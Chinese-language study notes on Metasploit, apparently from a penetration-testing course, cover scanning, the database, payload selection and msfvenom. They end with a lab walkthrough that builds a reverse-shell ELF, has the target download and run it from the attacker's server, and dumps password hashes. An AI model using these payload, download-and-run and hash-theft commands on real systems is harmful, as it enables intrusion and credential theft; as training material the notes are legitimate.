# 扫描
Metasploit包含多个用于扫描目标系统和网络上开放端口的模块。可以使用该`search portscan` 命令列出可用的端口扫描模块。

一些options：
- CONCURRENCY：并发数。同时扫描的目标数量。
- PORTS：端口要扫描的端口范围。如果设置为1-1000，Nmap 会扫描最常用的 1000 个端口，而 Metasploit 会扫描从 1 到 1000 的端口号。
- RHOSTS：要扫描的目标或目标网络。
- THREADS：线程数同时使用的线程数。线程越多，扫描速度越快。

## UDP 服务识别
`scanner/discovery/udp_sweep` 模块能够让你快速识别运行在 UDP（用户数据报协议）之上的服务。该模块并不会对所有可能的 UDP 服务进行全面深度扫描，但它提供了一种快速手段来识别诸如 DNS 或 NetBIOS 之类的常见服务。

如果你只需要确认目标是不是一台 DNS 服务器或 Windows 机器（NetBIOS），用这个模块比全端口扫描要高效得多。

## SMB 扫描
Metasploit 提供了几种非常有用的辅助模块，允许我们对特定服务进行扫描。

在企业网络环境中，smb_enumshares（枚举共享目录）和 smb_version（识别 SMB 版本）尤为实用。

## 其它
在执行服务扫描时，切记不要遗漏那些更为“特别”的服务，例如 NetBIOS。

NetBIOS（网络基本输入输出系统）与 SMB 类似，允许计算机通过网络进行通信，以共享文件或将文件发送至打印机。目标系统的 NetBIOS 名称往往能让你直观地了解到它的角色甚至重要性（例如：CORP-DC 可能代表域控制器，DEVOPS、SALES 销售部等）。

# Metasploit 数据库
实际的渗透测试项目中，通常会涉及多个目标。
Metasploit 拥有数据库功能，旨在简化项目管理，并避免在设置参数值时产生可能的混淆。

## 数据库启动与初始化步骤
1. 启动数据库服务：

    首先，你需要启动 Metasploit 所使用的 PostgreSQL 数据库，命令如下：`systemctl start postgresql`

2. 初始化 Metasploit 数据库：
    接着，你需要使用 `msfdb init` 命令进行初始化。

    注意：如果你尝试以 root 用户运行该命令，会收到错误提示：“Please run msfdb as a non-root user（请以非 root 用户运行 msfdb）”。

    解决方法：使用 postgres 账户来运行该命令：`sudo -u postgres msfdb init`
## 命令
- db_status：查看数据库状态
- workplace：列出可用的工作区。数据库功能允许您创建工作区来隔离不同的项目。首次启动时，用户应该位于默认工作区。
    - -a：创建一个新的工作区
    - -d：删除一个工作区
    - 工作区名：移动到相应工作区
    - -h：帮助手册
### db_nmap
db_nmap 就是 “带数据库自动记录功能的 Nmap”。

它允许你直接在 msfconsole 内部运行经典的 Nmap 扫描工具，并自动将扫描结果（主机 IP、开放端口、服务版本等）保存到 Metasploit 的数据库中。

如果你用 db_nmap，扫描结束后，你可以直接执行：
- hosts：查看所有发现的机器。
- services：查看所有开放的服务和端口。
- vulns：查看发现的漏洞（如果配合了脚本扫描）。

`hosts -h`和`services -h`命令可以帮助我们更熟悉可用的选项。

主机信息存储到数据库后，可以使用 `hosts -R` 命令将此值添加到 RHOSTS 参数中。

使用带有参数的命令 `services -S [name]`可以搜索环境中的特定服务。

如果你想攻击所有扫描到的 HTTP 服务器，你可以直接从数据库提取目标，而不需要一个个打字。

# 漏洞扫描
Metasploit 允许你快速识别一些关键漏洞，这些漏洞通常被称为“垂手可得的果实”（Low Hanging Fruit）。

这个术语通常指那些易于识别且易于利用的漏洞。通过它们，你可能轻松获取系统的初步访问权限（Foothold），在某些情况下，甚至能直接夺取 root 或 administrator 等高级权限。

利用 Metasploit 寻找漏洞，很大程度上取决于你扫描和识别目标“指纹”（Fingerprint）的能力。你在这些阶段做得越细致，Metasploit 能为你提供的攻击选项就越多。

例如，如果你识别出目标系统上运行着 VNC 服务，你可以使用 Metasploit 的 search 功能来列出相关的模块。搜索结果中会包含 payload 和 post 模块，但在当前阶段，这些结果并没有太大用处，因为我们还没有发现可以利用的具体漏洞（Exploit）。不过，针对 VNC，Metasploit 提供了好几个非常有用的Scanner modules供我们使用。
# 漏洞利用
您可以使用命令`search`搜索漏洞利用程序，使用命令`info`获取漏洞利用程序的更多信息，并使用命令`exploit`启动漏洞利用程序。虽然过程本身很简单，但请记住，成功与否取决于对目标系统上运行的服务的透彻理解。

大多数漏洞利用程序都会预设默认有效载荷。不过，您可以使用命令`show payloads`列出可用于该特定漏洞利用程序的其他命令。确定有效载荷后，您可以使用`set payload`命令进行选择。

请注意，由于环境或其他因素的影响，选择合适的有效载荷可能是一个反复试验的过程。操作系统防火墙规则、防病毒软件、文件写入等限制，或者执行有效载荷的程序不可用（例如 payload/python/shell_reverse_tcp）。

某些有效载荷会启用一些新的参数，您可能需要进行设置，show options再次运行命令即可显示这些参数。

开始运行后，可以CTRL+Z把会话挂到后台运行。通过`Session`可以查看当前后台运行的会话，`Session -i [num]`则可以选择对应的会话拉到前台。

***hashdump 是 Meterpreter 中强大的命令之一。它的唯一作用就是：从 Windows 系统的内存中提取（抓取）所有本地用户的账号和密码哈希值（Hashes）。***

# msfvenom
msfvenom 是 Metasploit 框架里的**木马工厂**

在Linux用户提示符下，用命令`msfvenom -l payloads`查看可用载荷。

它的核心作用是将攻击载荷打包成一个独立的可执行文件（如 .exe, .apk, .php），发给受害者运行。

1. 它的主要功能
在 msfvenom 出现之前，有两个独立的工具：msfpayload（生成载荷）和 msfencode（编码免杀）。后来它们合并成了现在的 msfvenom。它可以：

    - 生成载荷：支持数百种不同操作系统和协议的 Payload。

    - 编码免杀：通过混淆代码，尝试绕过杀毒软件的检测。

    - 格式转换：可以生成 Windows 的 .exe、Linux 的 elf、Android 的 .apk、Python 脚本、甚至图片里的恶意代码。

2. 一个典型的命令长什么样？
假设你想生成一个木马发给别人，命令通常是这样的：

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=你的IP LPORT=4444 -f exe -o virus.exe`

参数拆解：

- -p (Payload)：你要制造什么武器？（这里选了 64 位反弹 TCP）。

- LHOST/LPORT：木马运行后，应该把 Shell “回传”给谁？

- -f (Format)：输出文件的格式是什么？（这里是 Windows 的 exe）。

- -o (Output)：保存的文件名。

## 监听器 (Handlers)
与使用反弹 Shell（Reverse Shell）的漏洞利用模块类似，你需要能够接收由 MSFvenom 载荷生成的入站连接。

当你使用一个漏洞利用模块（Exploit Module）时，这部分工作是由该模块自动处理的。而在安全圈，接收来自目标的连接通常被称为“接 Shell”（Catching a shell）。由 MSFvenom 载荷生成的反弹 Shell 或 Meterpreter 回传，都可以通过 Handler 轻松地“接住”。

举个例子：我们将利用 DVWA中的文件上传漏洞。在本次任务的练习中，你需要在另一个目标系统上模拟类似的场景（此处使用 DVWA 仅作演示说明）。具体的攻击步骤如下：

1. 使用 MSFvenom 生成 PHP 版本的 Shell。
2. 启动 Metasploit 监听器 (Handler)。
3. 执行（访问）该 PHP Shell。

MSFvenom 生成载荷时需要三个核心要素：Payload 类型、本地机器 IP 地址 (LHOST) 以及载荷连接的本地端口 (LPORT)。

💡 这里的核心知识点：
自动 vs 手动：

自动：之前用“永恒之蓝”时，exploit 模块里自带了监听功能，所以一 run 就直接拿到了权限。

手动：如果你是发一个 exe 给别人，或者像文中说的那样上传一个 php 脚本，Metasploit 并不知道对方什么时候会运行它。所以你需要手动开启一个 multi/handler 模块，在那儿“死等”连接。

*msfvenom 生成的原始 PHP 代码往往会缺失开头的 PHP 标签注释以及结束标签 (?>)，需要手动微调一下。*

### Multi Handler（综合监听器）
我们将使用 Multi Handler（综合监听器）来接收传入的连接。你可以通过命令 `use exploit/multi/handler` 来启动该模块。

Multi Handler 支持 Metasploit 的所有载荷（Payload），既可以用于 Meterpreter，也可以用于普通的 Command Shell。

要使用此模块，我们需要设置以下参数：

- Payload 值:你在 msfvenom 里选了什么 Payload。
- LHOST（你的攻击机 IP）。
- LPORT（你设定的监听端口）。

# 一次利用msfvenom的hackin
①在攻击机用户提示符下输入`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<攻击机IP> LPORT=4444 -f elf -o shell.elf`成功创建一个木马文件。

②在攻击机输入`python3 -m http.server 9000`来运行http服务。方便目标机下载木马。

③在攻击机msfconsole提示符下运行`use exploit/multi/handler`启用综合监听器，并设置好payload、LHOST、LPORT。执行run来运行监听器。

④在目标机（Linux）上运行`wget http://攻击机IP:9000/shell.elf`，并执行`chmod +x shell/elf`，使得木马文件可执行。

⑤在目标机`./shell.elf`运行木马文件，发现攻击机运行着监听器的终端反弹了一个meterpreter shell。

⑥在meterpreter使用后渗透模块`run post/linux/gather/hashdump`来起到类似windows的hashdump的功能，将所有用户的密码哈希抓取出来，入侵结束。